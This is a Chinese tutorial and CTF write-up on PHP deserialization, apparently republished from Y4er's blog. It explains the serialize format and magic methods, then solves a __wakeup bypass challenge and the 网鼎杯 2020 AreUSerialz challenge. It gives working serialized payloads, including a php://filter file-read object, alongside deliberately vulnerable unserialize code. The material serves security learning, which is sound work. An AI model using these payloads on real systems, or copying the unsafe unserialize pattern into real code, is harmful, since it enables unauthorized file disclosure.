---
title: "PHP反序列化——魔术方法"
description: "PHP 反序列化中常用魔术方法的触发条件与利用方式整理。"
publishDate: "2025-09-22T00:00:00+08:00"
ogImage: "https://pub-0e9b5be439a54fec9fbbd5bd26cbd38c.r2.dev/2026/07/0df31c475c0bdfdc371dbfa6f0fbe139.jpeg"
categories: ["PHP Security"]
tags: ["php", "反序列化"]
---
转载于：[PHP反序列化学习](https://y4er.com/posts/unserialize/) from [Y4er](https://github.com/Y4er)&#x20;



## 序列化

在了解反序列化之前我们首先要知道什么是序列化。

在php中，序列化函数是`serialize()`。

```php
<?php
class User
{
    public $name;
    private $sex;
    protected $money = 1000;
    
    public function __construct($data, $sex)
    {
        $this->data = $data;
        $this->sex = $sex;
    }
}

$number = 66;
$str = 'Y4er';
$bool = true;
$null = NULL;
$arr = array('a' => 1, 'b' => 2);
$user = new User('jack', 'male');

var_dump(serialize($number));
echo '<hr>';
var_dump(serialize($str));
echo '<hr>';
var_dump(serialize($bool));
echo '<hr>';
var_dump(serialize($null));
echo '<hr>';
var_dump(serialize($arr));
echo '<hr>';
var_dump(serialize($user));
```

在这里我们分别序列化了数字、字符串、布尔值、空、数组、对象。看下输出结果

```plain text
string(5) "i:66;"string(11) "s:4:"Y4er";"string(4) "b:1;"string(2) "N;"string(30) "a:2:{s:1:"a";i:1;s:1:"b";i:2;}"string(99) "O:4:"User":4:{s:4:"name";N;s:9:"Usersex";s:4:"male";s:8:"*money";i:1000;s:4:"data";s:4:"jack";}"
```

以此我们知道序列化不同类型的格式为

```python
Integer : i:value;
String : s:size:value;
Boolean : b:value;(保存1或0)
Null : N;
Array : a:size:{key definition;value definition;(repeated per element)}
Object : O:strlen(object name):object name:object size:{s:strlen(property name):property name:property definition;(repeated per property)}
```

在这里需要注意一点就是object的private和protected属性的长度问题：

```plain text
string(99) "O:4:"User":4:{s:4:"name";N;s:9:"Usersex";s:4:"male";s:8:"*money";i:1000;s:4:"data";s:4:"jack";}"
```

可以看到Usersex的长度为9，是因为php序列化属性值时，如果变量前是protected，则会在变量名前加上\x00\*\x00,private则会在变量名前加上\x00类名\x00。

1. %00User%00sex 表示 private

2. %00\*%00money 表示protected





## 魔术方法

在php中，有着一系列的魔术方法，他们和C#中的构造方法相似，都是在某一条件满足下自动运行，一般用于初始化对象。我们在这里列举一些

```php
__construct()//创建对象时触发
__destruct() //对象被销毁时触发
__call() //在对象上下文中调用不可访问的方法时触发
__callStatic() //在静态上下文中调用不可访问的方法时触发
__get() //用于从不可访问的属性读取数据
__set() //用于将数据写入不可访问的属性
__isset() //在不可访问的属性上调用isset()或empty()触发
__unset() //在不可访问的属性上使用unset()时触发
__invoke() //当脚本尝试将对象调用为函数时触发
__toString() //把类当作字符串使用时触发
__wakeup() //使用unserialize时触发
__sleep() //使用serialize时触发
```

## \_\_wakeup反序列化对象注入

```php
PHP5 < 5.6.25
PHP7 < 7.0.10
```

### Q1

```php
<?php
class SoFun {
    protected $file = 'index.php';
    
    function __destruct() {
        if (!empty($this->file)) {
            if (strchr($this->file, "\\") === false && strchr($this->file, '/') === false) {
                show_source(dirname(__FILE__) . '/' . $this->file);
            } else {
                die('Wrong filename.');
            }
        }
    }
    
    function __wakeup() {
        $this->file = 'index.php';
    }
    
    public function __toString() {
        return '';
    }
}

if (!isset($_GET['file'])) {
    show_source('index.php');
} else {
    $file = base64_decode($_GET['file']);
    echo unserialize($file);
}
?>
#<!--key in flag.php-->
```

首先阅读题意，可以看到要通过base64传递file参数来反序列化将`$file`变量改变为`flag.php`，从而读出flag。

但是有一个问题，`__wakeup`函数是在反序列化时就执行，而`__destruct`是在对象销毁时执行，也就是说`__wakeup`比`__destruct`先执行，而`__wakeup`会执行`$this->file = 'index.php';`，所以我们现在要想办法将file变成`flag.php`并且要绕过`__wakeup`函数调用`__destruct`函数。

* 这里用到了一个PHP反序列化对象注入漏洞

  * 当序列化字符串中，表示对象属性个数的值大于实际属性个数时，那么就会跳过`wakeup`方法的执行。

首先准备反序列化对象

```plain text
$i = new SoFun();echo serialize($i);
```

`O:5:"SoFun":1:{s:7:"*file";s:9:"index.php";}`

我们需要将file的%00补上

`O:5:"SoFun":1:{s:7:"%00*%00file";s:9:"index.php";}`

修改flag.php

`O:5:"SoFun":1:{s:7:"%00*%00file";s:8:"flag.php";}`

绕过`wakeup`

`O:5:"SoFun":2:{s:7:"%00*%00file";s:8:"flag.php";}`

然后需要urldecode一下，将%00转为空字节，最后base64之后就是payload了

`http://php.local/index.php?file=Tzo1OiJTb0Z1biI6Mjp7czo3OiIAKgBmaWxlIjtzOjg6ImZsYWcucGhwIjt9`







## php7.1+反序列化对类属性不敏感

### \[网鼎杯 2020 青龙组]AreUSerialz

```php
<?php
include("flag.php");

highlight_file(__FILE__);

class FileHandler {

    protected $op;
    protected $filename;
    protected $content;

    function __construct() {
        $op = "1";
        $filename = "/tmp/tmpfile";
        $content = "Hello World!";
        $this->process();
    }

    public function process() {
        if($this->op == "1") {
            $this->write();
        } else if($this->op == "2") {
            $res = $this->read();
            $this->output($res);
        } else {
            $this->output("Bad Hacker!");
        }
    }

    private function write() {
        if(isset($this->filename) && isset($this->content)) {
            if(strlen((string)$this->content) > 100) {
                $this->output("Too long!");
                die();
            }
            $res = file_put_contents($this->filename, $this->content);
            if($res) $this->output("Successful!");
            else $this->output("Failed!");
        } else {
            $this->output("Failed!");
        }
    }

    private function read() {
        $res = "";
        if(isset($this->filename)) {
            $res = file_get_contents($this->filename);
        }
        return $res;
    }

    private function output($s) {
        echo "[Result]: <br>";
        echo $s;
    }

    function __destruct() {
        if($this->op === "2")
            $this->op = "1";
        $this->content = "";
        $this->process();
    }

}

function is_valid($s) {
    for($i = 0; $i < strlen($s); $i++)
        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
            return false;
    return true;
}

if(isset($_GET{'str'})) {

    $str = (string)$_GET['str'];
    if(is_valid($str)) {
        $obj = unserialize($str);
    }

}
```

在特定版本7.1以上对于类属性不敏感，即使没有\x00\*\x00也依然会正常输出。

```php
<?php
class Test{
    protected $M;
    public function __construct(){
        $this->$M = 'ssss';
    }
    public function __destruct(){
        echo $this->$M;
    }
}
unserialize('O:4:”test”:1:{s:1:”a”;s:3:”sss”;}');

#输出：sss
```

用户可控 `$_GET['str']` 在通过 `is_valid()`（仅允许 ASCII 32–125 可打印字符）后被 `unserialize()` 反序列化。

类 FileHandler：

- protected `$op`、`$filename`、`$content`
- `process()`：`$op == “1”` 写文件；`$op == “2”` 读文件并输出
- `__destruct()`：若 `$this->op === “2”` 则重置为 `”1”`，清空 `$content`，然后再次调用 `process()`

**两处关键绕过：**

1. **属性可见性绕过（PHP 7.1+）**：反序列化对类属性可见性”变得不敏感”，可用”公开属性键名”直接覆盖 protected 属性，避免 `\x00*\x00`（不可打印字节）无法通过 `is_valid()` 检查的问题。
2. **类型比较绕过**：`process()` 用松等 `==`，`__destruct()` 用全等 `===`。将 op 设为整型 `2`：
   - 在 `process()`：`2 == “2”` 为真，进入读分支；
   - 在 `__destruct()`：`2 === “2”` 为假，不会把 op 改回 `”1”`，析构里再次调用 `process()` 仍会读。

设定：

- `op = 2`（整型）
- `filename = “php://filter/read=convert.base64-encode/resource=flag.php”`（用过滤器读源码）
- `content = null`

传入序列化载荷（需 URL 编码后给 `?str=`）：

```plain text
O:11:”FileHandler”:3:{s:2:”op”;i:2;s:8:”filename”;s:57:”php://filter/read=convert.base64-encode/resource=flag.php”;s:7:”content”;N;}
```

页面会输出 Base64 的文件内容，客户端解码即可得到 flag.php 源码，从而看见 `$flag`。

## Reference：
[php 反序列化格式基础](https://dummykitty.github.io/posts/php-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%A0%BC%E5%BC%8F%E5%9F%BA%E7%A1%80/#null-%E5%92%8C%E6%A0%87%E9%87%8F%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96)

[ThinkPHP5.0.24反序列化利用链](https://www.freebuf.com/vuls/385440.html)

[PHP序列化、反序列化漏洞超全总结](https://forum.butian.net/index.php/share/3007)